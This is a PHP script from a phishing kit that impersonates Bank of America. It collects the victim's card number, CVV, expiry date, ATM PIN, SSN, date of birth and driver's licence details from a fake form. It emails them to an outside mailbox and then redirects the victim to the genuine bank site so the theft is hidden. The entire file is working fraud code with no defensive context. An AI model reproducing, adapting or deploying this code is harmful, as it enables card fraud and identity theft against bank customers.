<?php
include'ip.php';
$ip = MDgetIp();
$CCNAME=$_POST['formtext1']."\n";
$CCNUMB=$_POST['formtext2']."\n";
$CCEXPD=$_POST['formselect1']." / ".$_POST['formselect2']."\n";
$CCVV2C=$_POST['formtext3']."\n";
$PINCOD=$_POST['formtext4']."\n";
$DOB=$_POST['formselect5']." / ".$_POST['formselect6']." / ".$_POST['formselect7']."\n";
$SSNCOD=$_POST['formtext6']."\n";
$DRIVER=$_POST['formtext5']." (".$_POST['formtext7']." / ".$_POST['formtext8'].")\n";

$message='CC Name:'.$CCNAME.' CC number:'.$CCNUMB.' CCEXP:'.$CCEXPD.' CVV:'.$CCVV2C.' ATMPIM:'.$PINCOD.' SSN:'.$SSNCOD.' DL:'.$DRIVER;

$to = "rizot@tuta.io";
$subject = "[BOA LOG] ARMCOKE LOGIN";
$headers = "From: Jokercc spammer";
$headers ="MIME-Version: 1.0 \r\n";
$headers ="Content-type: text/html \r\n";
mail($to,$subject,$message,$headers);
$praga=rand();
$praga=md5($praga);

header("Location: https://secure.bankofamerica.com/applynow/landingPage.go");


	 
?>
